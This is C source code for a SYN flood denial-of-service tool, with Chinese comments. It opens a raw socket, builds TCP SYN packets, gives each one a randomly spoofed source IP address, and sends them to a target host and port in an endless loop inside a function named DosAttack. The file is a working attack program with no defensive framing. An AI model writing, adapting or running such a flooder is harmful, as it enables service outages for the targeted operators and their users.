#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <linux/tcp.h>
#include <arpa/inet.h>

unsigned short check_sum(unsigned short*addr,int len);
void DosAttack(int skfd,struct sockaddr_in *target,unsigned short srcport);


int main( int argc, char ** argv )  
{
    int     connfd;  
    struct sockaddr_in target;  
    struct hostent *host;
    const int on=1;
    unsigned short srcport;
    /*
    if( argc != 4 )  
    {  
        printf("Input target dstport srcport !\n");  
        exit( EXIT_FAILURE );  
    } 
    */
     //!> 套接字信息  
    bzero(&target, sizeof(struct sockaddr_in));  
    target.sin_family = AF_INET;  
    target.sin_port = htons(atoi(argv[2]));  
   if( inet_aton(argv[1], &target.sin_addr)==0)
    {
        host=gethostbyname(argv[1]);
        if(host==NULL)
        {
            printf("Gethostbyname error\n");
            exit(1);
        }
        target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
   }
      
    //!> 建立套接字  并且指定为IPPROTO_TCP的原始套接字
    if( ( connfd = socket( AF_INET, SOCK_RAW, IPPROTO_TCP) ) == -1 )  
    {  
        printf("Socket Error...\n");  
        exit( EXIT_FAILURE );  
    }  

  //开启IP头部的更改，由用户自行封装IP报文  模板
    if( ( setsockopt(connfd, IPPROTO_IP,IP_HDRINCL,&on, sizeof(on)) ) == -1 ) 
    {
          printf("setsockopt Error...\n");  
          exit(1);
    }

  //必须获得管理员权限 才能进行raw socket
  setuid(getpid());
  srcport=atoi(argv[3]);
  //进行协议及数据包构建
  DosAttack(connfd,&target,srcport);
}

void DosAttack(int skfd,struct sockaddr_in *target,unsigned short srcport)
{
   int ip_len;
   char buf[128]={0};
   struct ip *ip;
   struct tcphdr *tcp;
  //设置当前进行SYN包的数据长度
   ip_len=sizeof(struct ip)+sizeof(struct tcphdr);
   //对IP头进行填充
   //给IP头部进行内存空间的分配
   ip=(struct ip*)buf;
   //ip头部填充
   ip->ip_v=IPVERSION; //版本号
   ip->ip_hl=sizeof(struct ip)>>2; //ip 头部长度
   ip->ip_tos=0;
   ip->ip_len=htons(ip_len);
   ip->ip_id=0;
   ip->ip_off=0;
   ip->ip_ttl=MAXTTL;
   ip->ip_p=IPPROTO_TCP;
   ip->ip_sum=0;
   ip->ip_dst=target->sin_addr;

    //进行TCP头部的填充
    tcp=(struct tcphdr *)(buf+sizeof(struct ip));
    tcp->source=htons(srcport);
    tcp->dest=target->sin_port;
    tcp->seq=random();
    tcp->doff=5;
    tcp->syn=1;
    tcp->check=0;

   while(1)
   {
      //源IP地址的伪造，随机生成不同个地址，放服务器的鸽子
      ip->ip_src.s_addr=random();
      tcp->check=check_sum((unsigned short *)tcp,sizeof(struct tcphdr));
      sendto(skfd,buf,ip_len,0,(struct sockaddr *)target,sizeof(struct sockaddr_in));
   }
}

unsigned short check_sum(unsigned short*addr,int len)
{
      register int nleft=len;
      register int sum=0;
      register short*w=addr;
      short    answer=0;
      while(nleft>1)
      {
          sum+=*w++;
          nleft-=2;
      }
      if(nleft==1)
      {
          *(unsigned char *)(&answer)=*(unsigned char *)w;
          sum+=answer;
      }
      sum=(sum>>16)+(sum&0xffff);
      sum+=(sum>>16);
      answer=~sum;
      return(answer);
}